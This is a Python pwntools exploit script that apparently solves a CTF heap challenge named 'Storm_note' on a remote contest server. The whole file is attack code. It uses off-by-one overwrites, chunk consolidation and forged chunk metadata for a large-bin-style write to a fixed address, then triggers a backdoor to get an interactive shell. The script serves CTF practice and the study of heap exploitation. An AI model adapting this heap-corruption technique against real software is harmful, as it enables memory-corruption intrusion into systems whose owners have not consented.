# -*- coding:utf-8 -*-
from pwn import *

def alloc(size):
    io.sendlineafter('Choice:','1')
    io.sendlineafter('size ?',str(size))


def update(idx,content):
    io.sendlineafter('Choice:','2')
    io.sendlineafter('Index ?',str(idx))
    io.sendlineafter('Content:',str(content))

def free(idx):
    io.sendlineafter('Choice:','3')
    io.sendlineafter('Index ?',str(idx))

def backdoor(lucky):
    io.sendlineafter('Choice:','666')
    io.sendlineafter('If you can open the lock, I will let you in',str(lucky))

# gdb.attach(io)

while True:
    # io = process('./Storm_note')
    io = remote('ctf1.linkedbyx.com',10184)
    alloc(0x18)     #0
    alloc(0x508)    #1
    alloc(0x18)     #2


    update(1, 'h'*0x4f0 + p64(0x500))   #set fake prev_size


    alloc(0x18)     #3
    alloc(0x508)    #4
    alloc(0x18)     #5

    update(4, 'h'*0x4f0 + p64(0x500))   #set fake prev_size
    alloc(0x18)     #6

    free(1)
    update(0, 'h'*(0x18))    #off-by-one
    alloc(0x18)     #1
    alloc(0x4d8)    #7
    free(1)
    free(2)         #backward consolidate


    alloc(0x38)     #1
    alloc(0x4e8)    #2

    free(4)
    update(3, 'h'*(0x18))    #off-by-one
    alloc(0x18)     #4
    alloc(0x4d8)    #8
    free(4)
    free(5)         #backward consolidate
    alloc(0x48)     #4

    free(2)
    alloc(0x4e8)    #2
    free(2)

    storage = 0xABCD0100 #+ 0x800
    fake_chunk = storage - 0x20


    p1 = p64(0)*2 + p64(0) + p64(0x4f1) #size
    p1 += p64(0) + p64(fake_chunk)      #bk
    update(7, p1)


    p2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
    p2 += p64(0) + p64(fake_chunk+8)
    p2 += p64(0) + p64(fake_chunk-0x18-5)

    # gdb.attach(io)

    update(8, p2)
    
    try:
        alloc(0x48) #2
    except EOFError:
        io.close()
        continue


    try:
        update(2,'1'*0x40)
    except EOFError:
        io.close()
        continue
    backdoor('1'*0x40)
    break

io.interactive()


